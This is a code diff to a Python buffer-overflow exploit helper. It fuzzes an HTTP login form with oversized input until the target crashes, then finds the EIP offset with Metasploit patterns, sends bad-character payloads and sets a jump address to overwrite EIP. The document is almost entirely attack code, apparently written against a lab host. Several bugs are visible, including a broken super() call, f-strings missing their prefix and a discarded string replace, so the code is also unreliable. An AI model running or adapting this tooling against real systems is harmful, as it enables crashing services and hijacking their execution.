@@ -35,7 +35,11 @@ class InvalidTargetPortError(TypeError):
 
 class InvalidMemoryAddressError(ValueError):
 	"""Will be raised if value passed into the `jump_eip`
+	does not contain a length of four which will be the four
+	bytes that overwrite the EIP.
 	"""
+	def __init__(self, error_msg):
+		super.__init__(error_msg)
 
 
 class NoOffsetError(ValueError):
@@ -76,22 +80,24 @@ class Ezbuff:
 			_receive_bytes (int): The number of bytes we will receive from the target machine at once.
 
 		Raises:
-			exceptions.InvalidTargetIPError if invalid IP addresses is passed as an argument.
-			exceptions.InvalidTargetPortError if invalid port number is passed as an argument.
+			InvalidTargetIPError if invalid IP addresses is passed as an argument.
+			InvalidTargetPortError if invalid port number is passed as an argument.
 		"""
 		try:
 			if not isinstance(targ_ip, str):
-				raise exceptions.InvalidTargetIPError(r+"The target IP address must be a string."+rst)
+				raise InvalidTargetIPError("The target IP address must be a string.")
 			if not search(r"[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}", targ_ip):
-				raise exceptions.InvalidTargetIPError(r+"The target IP address is not a valid IP address."+rst)
+				raise InvalidTargetIPError("The target IP address is not a valid IP address.")
 			self._targ_ip = targ_ip
 			if not isinstance(targ_port, int):
-				raise exceptions.InvalidTargetPortError(r+"The target port number must be an integer between 1-65535"+rst)
+				raise InvalidTargetPortError("The target port number must be an integer between 1-65535")
+		except InvalidTargetIPError as err:
+			print(r + "Invalid Target IP: {err}" + rst)
+		except InvalidTargetPortError as err:
+			print(r + "Invalid Target Port Error: {err}" + rst)
+		else:
 			self._targ_port = targ_port
-		except exceptions.InvalidTargetIPError as err:
-			print(r+"Invalid Target IP: {err}"+rst)
-		except exceptions.InvalidTargetPortError as err:
-			print(r+"Invalid Target Port Error: {err}"+rst)
+			self._targ_ip = targ_ip
 
 		self._bad_chars_found = []
 		self._nop_sled = "\x90"*16
@@ -169,7 +175,8 @@ class Ezbuff:
 
 	@property
 	def offset(self):
-		""""""
+		"""
+		"""
 		return self._offset
 
 
@@ -198,44 +205,64 @@ class Ezbuff:
 			jump_mem_location (str): The memory address that will be used to jump the EIP obtained
 										to execute our payload. Example = \x8f\x35\x4a\x5f
 		"""
-		self.jump_eip = jump_mem_location
+		try:
+			if len(jump_mem_location) != 4:
+				raise InvalidMemoryAddressError("The memory address to over the EIP register must be four bytes long.")
+		except InvalidMemoryAddressError as err:
+			print(r+"Invalid Memory Address Error: {err}"+rst)
+		else:
+			self.jump_eip = jump_mem_location
 
 
-	def fuzz(self):
+	def fuzz(self, chars=None):
 		"""Sends an incrementing number of bytes to an application
 		until it crashes or returns an error and then prints out the
-		number of bytes at the moment of the crash/error.
+		number of bytes at the moment of the crash/error. If arg bad_char
+		is passed, function will send bad characters payload.
 
 		Args:
-		targ_ip (str): The target's IP address.
-		targ_port (int): The target's port number.
+			chars (str): Will determine if bad characters string will be sent, default=None 
 		"""
 
+		buff = "POST /login HTTP/1.1\r\n"
+		buff += "Host: 10.11.0.22\r\n"
+		buff += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
+		buff += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+		buff += "Accept-Language: en-US,en;q=0.5\r\n"
+		buff += "Referer: http://10.11.0.22/login\r\n"
+		buff += "Connection: close\r\n"
+		buff += "Content-Type: application/x-www-form-urlencoded\r\n"
+
 		self._num_bytes_crash = 50
-		while True:
-			soc = self._create_socket()
+
+		soc = self._create_socket()
+
+		if not chars:
+			content = "username=" + 'A'*self._num_bytes_crash + "&password=A"
+			buff += f"Content-Length: {str(len(content))}\r\n"
+			buff += "\r\n"
+			buff += content
+			while True:
+				with soc:
+					try:
+						soc.send(buff)
+						soc.close()
+						sleep(10)
+					except OSError:
+						print(f"Number of bytes sent at crash: {self._num_bytes_crash}")
+						self._num_bytes_crash -= 50
+					finally:
+						self._num_bytes_crash += 50
+		else:
+			content = "A"*self.offset + "B"*4 + chars + "C"*(self._num_bytes_crash-self.offset-4-len(Ezbuff.chars))
+			buff += f"Content-Length: {str(len(content))}\r\n"
+			buff += "\r\n"
+			buff += content
 			with soc:
-				content = "username=" + 'A'*self._num_bytes_crash + "&password=A"
-				buff = "POST /login HTTP/1.1\r\n"
-				buff += "Host: 10.11.0.22\r\n"
-				buff += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
-				buff += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-				buff += "Accept-Language: en-US,en;q=0.5\r\n"
-				buff += "Referer: http://10.11.0.22/login\r\n"
-				buff += "Connection: close\r\n"
-				buff += "Content-Type: application/x-www-form-urlencoded\r\n"
-				buff += f"Content-Length: {str(len(content))}\r\n"
-				buff += "\r\n"
-				buff += content
 				try:
 					soc.send(buff)
-					soc.close()
-					sleep(10)
-				except:
-					print(f"Number of bytes sent at crash: {self._num_bytes_crash}")
-					self._num_bytes_crash -= 50
-				finally:
-					self._num_bytes_crash += 50
+				except OSError as err:
+					print(r + "Socket Error: {err}" + rst)
 	
 
 	def send_msf_pattern(self):
@@ -250,7 +277,8 @@ class Ezbuff:
 
 
 	def _generate_msf_pattern(self):
-		""""""
+		"""
+		"""
 		output = sp.run(['/usr/share/metasploit-framework/tools/pattern_create.rb', self._num_bytes_crash])
 		return output.stdout
 		
@@ -266,15 +294,16 @@ class Ezbuff:
 
 
 	def test_offset(self):
-		""""""
+		"""
+		"""
 		try:
 			if self._offset:
 				payload = "A"*self._offset + "B"*4 + "C"*(self._num_bytes_crash-self._offset-4)
 				bytes_payload = bytes(payload, "utf-8")
 			else:
-				raise exceptions.NoOffsetError(r+"Please run `get_offset` to get and set offset value."+rst)
-		except exceptions.NoOffsetError as err:
-			print(f"NoOffsetError: {err}")
+				raise NoOffsetError("Please run `get_offset` to get and set offset value.")
+		except NoOffsetError as err:
+			print(r + f"NoOffsetError: {err}" + rst)
 
 		soc = self._create_socket()
 		with soc:
@@ -282,11 +311,13 @@ class Ezbuff:
 		
 
 	def send_bad_chars(self):
-		""""""
-		# use chars.replace to remove bad characters discovered by user.
-		soc = self._create_socket()
-		with soc:
-			soc.send(Ezbuff.)
+		"""
+		"""
+		copy_chars = Ezbuff.chars
+		for char in self._bad_chars_found:
+			copy_chars.replace(char, "")
+		self.fuzz(copy_chars)
+
 
 	def _create_socket(self):
 		"""
@@ -295,7 +326,7 @@ class Ezbuff:
 			soc = s.socket(s.AF_INET, s.SOCK_STREAM)
 			soc.connect((self._targ_ip, self._targ_port))
 		except OSError as err:
-			print(r+"OSError: {err}"+rst)
+			print(r + "OSError: {err}" + rst)
 		return soc
 
 
